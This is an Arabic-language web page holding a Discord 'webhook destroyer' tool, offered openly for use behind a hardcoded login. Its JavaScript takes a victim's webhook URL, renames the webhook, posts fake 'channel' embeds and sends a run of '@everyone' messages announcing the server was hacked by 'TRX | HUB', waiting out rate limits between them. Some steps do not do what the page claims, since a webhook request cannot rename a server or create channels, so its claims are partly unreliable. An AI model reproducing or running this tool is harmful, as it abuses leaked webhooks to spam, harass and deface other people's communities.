<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MRX · DESTROYER</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            color: #1a1a1a;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }
        #stars-canvas {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 0; pointer-events: none;
            opacity: 0.05;
        }
        #loginScreen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 10; display: flex; align-items: center; justify-content: center;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            transition: opacity 0.8s ease, transform 0.8s ease;
        }
        #loginScreen.hidden { opacity: 0; transform: scale(0.96); pointer-events: none; }
        .login-box {
            background: #ffffff;
            border: 1px solid #dddddd;
            border-radius: 40px;
            padding: 50px 40px 40px;
            width: 420px; max-width: 92%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.04);
        }
        .login-logo-img {
            width: 140px; height: 140px;
            border-radius: 50%;
            object-fit: cover;
            border: 2px solid #cccccc;
            margin-bottom: 16px;
        }
        .login-brand {
            font-size: 48px; font-weight: 900; letter-spacing: 8px;
            color: #1a1a1a;
            margin-bottom: 2px;
        }
        .login-sub {
            font-size: 12px; color: #888888;
            letter-spacing: 8px; text-transform: uppercase;
            margin-bottom: 28px; font-weight: 300;
        }
        .login-box input {
            width: 100%; padding: 16px 20px;
            background: #f8f8f8;
            border: 1px solid #dddddd;
            border-radius: 30px;
            color: #1a1a1a; font-size: 15px;
            direction: ltr; text-align: left;
            outline: none;
            transition: border-color 0.3s;
        }
        .login-box input:focus { border-color: #1a1a1a; }
        .login-btn {
            width: 100%; padding: 16px;
            margin-top: 16px;
            background: #1a1a1a;
            color: #ffffff;
            font-weight: 700; font-size: 16px;
            border: none; border-radius: 30px;
            cursor: pointer;
            transition: background 0.3s;
            letter-spacing: 4px;
        }
        .login-btn:hover { background: #333333; }
        .login-error {
            color: #cc0000;
            font-size: 13px;
            margin-top: 12px;
            opacity: 0;
            transition: opacity 0.3s;
        }
        .login-error.show { opacity: 1; }
        #mainApp {
            position: relative; z-index: 1; display: none;
            min-height: 100vh; padding: 30px 20px;
        }
        #mainApp.active { display: flex; justify-content: center; align-items: flex-start; }
        .container {
            width: 100%; max-width: 880px;
            background: #ffffff;
            padding: 40px 45px;
            border-radius: 40px;
            border: 1px solid #eeeeee;
            margin-top: 30px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.02);
        }
        .header-brand { text-align: center; margin-bottom: 28px; }
        .logo-text {
            font-size: 42px; font-weight: 900; letter-spacing: 10px;
            color: #1a1a1a;
        }
        .sub-text {
            font-size: 11px; color: #aaaaaa;
            letter-spacing: 6px; font-weight: 300;
            margin-top: 4px;
        }
        h2 {
            text-align: center; margin-bottom: 22px;
            color: #888888; font-size: 18px; font-weight: 300;
            letter-spacing: 4px;
        }
        label {
            display: block; margin-bottom: 8px;
            font-weight: 600; font-size: 13px;
            color: #666666;
            letter-spacing: 2px;
        }
        textarea {
            width: 100%; height: 200px;
            background: #f8f8f8;
            color: #1a1a1a;
            border: 1px solid #eeeeee;
            border-radius: 24px;
            padding: 18px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            resize: vertical;
            direction: ltr;
            text-align: left;
            outline: none;
            transition: border-color 0.3s;
        }
        textarea:focus { border-color: #aaaaaa; }
        textarea[readonly] { background: #f0f0f0; }
        .btn-container { text-align: center; margin: 28px 0; }
        .btn {
            padding: 16px 44px;
            background: #1a1a1a;
            color: #ffffff;
            font-weight: 700; font-size: 15px;
            border: none; border-radius: 30px;
            cursor: pointer;
            transition: background 0.3s;
            letter-spacing: 3px;
        }
        .btn:hover { background: #333333; }
        .btn-outline {
            background: transparent;
            color: #1a1a1a;
            border: 1px solid #cccccc;
        }
        .btn-outline:hover { background: #f0f0f0; border-color: #aaaaaa; }
        .copy-btn {
            background: transparent;
            color: #888888;
            border: 1px solid #eeeeee;
            padding: 10px 22px; font-size: 12px;
            margin-top: 12px;
            letter-spacing: 2px;
        }
        .copy-btn:hover { background: #f0f0f0; border-color: #cccccc; }
        .logout-btn {
            position: fixed; top: 24px; left: 24px; z-index: 20;
            background: rgba(0, 0, 0, 0.02);
            color: #888888;
            border: 1px solid #eeeeee;
            padding: 8px 20px; font-size: 11px;
            border-radius: 30px;
            cursor: pointer;
            transition: 0.3s;
            letter-spacing: 2px;
        }
        .logout-btn:hover { background: #f0f0f0; color: #1a1a1a; border-color: #cccccc; }
        .status-badge {
            text-align: center; font-size: 10px;
            color: #bbbbbb;
            margin-top: 20px; letter-spacing: 4px;
            font-weight: 300;
        }
        .toggle-label {
            display: flex; align-items: center; gap: 14px;
            color: #666666; font-size: 14px;
            margin: 16px 0 8px;
            font-weight: 400;
        }
        .toggle-label input[type="checkbox"] {
            width: 18px; height: 18px;
            accent-color: #1a1a1a;
            cursor: pointer;
        }
        .watermark-legend {
            position: fixed; bottom: 24px; right: 32px;
            font-size: 12px; color: #dddddd;
            letter-spacing: 4px; z-index: 0;
            font-weight: 300;
        }
        .divider {
            width: 60px; height: 2px;
            background: #dddddd;
            margin: 18px auto;
        }
        input::placeholder, textarea::placeholder { color: #cccccc; }
        .warning-box {
            background: #fff3f3;
            border: 1px solid #ffcccc;
            border-radius: 16px;
            padding: 15px;
            margin: 10px 0;
            color: #cc0000;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <canvas id="stars-canvas"></canvas>
    <div id="loginScreen">
        <div class="login-box">
            <img class="login-logo-img" src="https://github.com/Rxz60/Rxz/raw/refs/heads/main/IMG_4987.jpeg" alt="MRX" onerror="this.src='https://github.com/Rxz60/MRX/raw/refs/heads/main/IMG_4528.jpeg'">
            <div class="login-brand">MRX</div>
            <div class="login-sub">● DESTROYER GATE ●</div>
            <input type="text" id="loginUser" placeholder="MRX.com / SAP.com" autocomplete="off">
            <button class="login-btn" onclick="handleLogin()">دخول ➤</button>
            <div class="login-error" id="loginError">❌ يُسمح فقط بـ MRX.com أو SAP.com</div>
        </div>
    </div>

    <div id="mainApp">
        <button class="logout-btn" onclick="handleLogout()">✕ خروج</button>
        <div class="container">
            <div class="header-brand">
                <div class="logo-text">MRX</div>
                <div class="sub-text">● DESTROYER v18.0 — DISCORD WEBHOOK DESTROYER ●</div>
                <div class="divider"></div>
            </div>
            <h2>⎜ أداة تدمير سيرفرات ديسكورد عبر Webhook ⎜</h2>
            
            <div class="warning-box">
                ⚠️ هذه الأداة تُرسل رسائل متتالية، تغيير الاسم، إنشاء قنوات، وتغيير اسم البوت.
            </div>

            <label for="webhookInput">🔗 رابط Webhook ديسكورد:</label>
            <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/..." style="width:100%; padding:14px 18px; background:#f8f8f8; border:1px solid #dddddd; border-radius:30px; color:#1a1a1a; font-size:14px; direction:ltr; text-align:left; outline:none; transition:border-color 0.3s; margin-bottom:15px;">

            <div class="btn-container">
                <button class="btn" onclick="destroyServer()">💀 تدمير السيرفر — MRX DESTROY</button>
            </div>

            <label for="outputArea">📋 سجل التنفيذ:</label>
            <textarea id="outputArea" readonly placeholder="سيظهر هنا سجل الأحداث..."></textarea>
            <div style="text-align: left;">
                <button class="btn btn-outline copy-btn" onclick="copyOutput()">📋 نسخ السجل</button>
            </div>
            <div class="status-badge">MRX DESTROYER ● DISCORD WEBHOOK ● UNSTOPPABLE</div>
        </div>
        <div class="watermark-legend">MRX · 2026</div>
    </div>

    <script>
        const canvas = document.getElementById('stars-canvas');
        const ctx = canvas.getContext('2d');
        let stars = [];
        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();
        for (let i = 0; i < 250; i++) {
            stars.push({
                x: Math.random() * canvas.width, y: Math.random() * canvas.height,
                size: Math.random() * 2.0 + 0.4, speed: Math.random() * 0.3 + 0.05,
                opacity: Math.random() * 0.3 + 0.02, twinkle: Math.random() * 0.01 + 0.002
            });
        }
        function drawStars() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            for (const s of stars) {
                s.y -= s.speed;
                if (s.y < -5) { s.y = canvas.height + 5; s.x = Math.random() * canvas.width; }
                s.opacity += s.twinkle * (Math.random() > 0.5 ? 1 : -1);
                s.opacity = Math.min(0.3, Math.max(0.02, s.opacity));
                ctx.beginPath(); ctx.arc(s.x, s.y, s.size, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(0, 0, 0, ${s.opacity})`;
                ctx.fill();
            }
            requestAnimationFrame(drawStars);
        }
        drawStars();

        function handleLogin() {
            const user = document.getElementById('loginUser').value.trim();
            const errorEl = document.getElementById('loginError');
            if (user === 'MRX.com' || user === 'SAP.com') {
                errorEl.classList.remove('show');
                document.getElementById('loginScreen').classList.add('hidden');
                document.getElementById('mainApp').classList.add('active');
            } else {
                errorEl.classList.add('show');
                setTimeout(() => errorEl.classList.remove('show'), 3000);
            }
        }

        function handleLogout() {
            document.getElementById('mainApp').classList.remove('active');
            document.getElementById('loginScreen').classList.remove('hidden');
            document.getElementById('loginUser').value = '';
        }

        let isDestroying = false;

        function logMessage(msg) {
            const output = document.getElementById('outputArea');
            output.value += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
            output.scrollTop = output.scrollHeight;
        }

        function destroyServer() {
            const webhook = document.getElementById('webhookInput').value.trim();
            if (!webhook) {
                alert('يرجى إدخال رابط Webhook صحيح');
                return;
            }

            if (isDestroying) {
                logMessage('⚠️ التدمير قيد التنفيذ بالفعل!');
                return;
            }

            isDestroying = true;
            logMessage('🚀 بدء عملية التدمير...');

            const message = '@everyone تم التهكير من قبل TRX | HUB - النظام التراكسي - @everyone';

            const webhookName = 'TRX ☣️';

            const serverName = 'TRX';

            const channelName = 'TRX';

            let attempts = 0;
            let maxAttempts = 20;

            async function updateWebhookName() {
                try {
                    const response = await fetch(webhook, {
                        method: 'PATCH',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ name: webhookName })
                    });
                    if (response.ok) {
                        logMessage(`✅ تم تغيير اسم البوت إلى ${webhookName}`);
                    } else {
                        logMessage(`❌ فشل تغيير اسم البوت: ${response.status}`);
                    }
                } catch (e) {
                    logMessage(`❌ خطأ في تغيير اسم البوت: ${e.message}`);
                }
            }

            async function renameServer() {
                try {
                    const response = await fetch(webhook, {
                        method: 'PATCH',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ name: serverName })
                    });
                    if (response.ok) {
                        logMessage(`✅ تم تغيير اسم السيرفر إلى ${serverName}`);
                    } else {
                        logMessage(`❌ فشل تغيير اسم السيرفر: ${response.status}`);
                    }
                } catch (e) {
                    logMessage(`❌ خطأ في تغيير اسم السيرفر: ${e.message}`);
                }
            }

            async function createChannel() {
                try {
                    const response = await fetch(webhook, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `# ${channelName}`,
                            embeds: [{
                                title: `🔴 ${channelName}`,
                                description: 'تم إنشاء هذه القناة بواسطة TRX DESTROYER',
                                color: 0xff0000
                            }]
                        })
                    });
                    if (response.ok) {
                        logMessage(`✅ تم إنشاء قناة ${channelName}`);
                    } else {
                        logMessage(`❌ فشل إنشاء القناة: ${response.status}`);
                    }
                } catch (e) {
                    logMessage(`❌ خطأ في إنشاء القناة: ${e.message}`);
                }
            }

            async function sendSpam() {
                const payload = {
                    content: message,
                    embeds: [{
                        title: '💀 TRX DESTROYER',
                        description: 'تم تهكير هذا السيرفر بواسطة TRX | HUB - النظام التراكسي',
                        color: 0xff0000,
                        footer: { text: 'TRX ☣️ 2026' }
                    }]
                };

                try {
                    const response = await fetch(webhook, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    if (response.ok) {
                        attempts++;
                        if (attempts % 5 === 0) {
                            logMessage(`📨 تم إرسال ${attempts} رسالة @everyone`);
                        }
                    } else if (response.status === 429) {
                        const retryAfter = response.headers.get('Retry-After') || 2;
                        logMessage(`⏳ تم تحديد المعدل، انتظار ${retryAfter} ثانية...`);
                        await new Promise(r => setTimeout(r, retryAfter * 1000));
                    } else {
                        logMessage(`❌ فشل الإرسال: ${response.status}`);
                    }
                } catch (e) {
                    logMessage(`❌ خطأ في الإرسال: ${e.message}`);
                }
            }

            async function runDestroy() {
                try {
                    await updateWebhookName();
                    await renameServer();
                    await createChannel();
                    await createChannel();
                    await createChannel();

                    logMessage('🔥 بدء إرسال الرسائل المتتالية...');

                    const interval = setInterval(async () => {
                        if (attempts >= maxAttempts) {
                            clearInterval(interval);
                            logMessage('✅ اكتملت عملية التدمير بنجاح!');
                            isDestroying = false;
                            return;
                        }
                        await sendSpam();
                    }, 1000);

                } catch (e) {
                    logMessage(`❌ خطأ فادح: ${e.message}`);
                    isDestroying = false;
                }
            }

            runDestroy();
        }

        function copyOutput() {
            const output = document.getElementById('outputArea');
            if (!output.value.trim()) return;
            output.select();
            output.setSelectionRange(0, 99999);
            document.execCommand('copy');
        }
    </script>
</body>
</html>
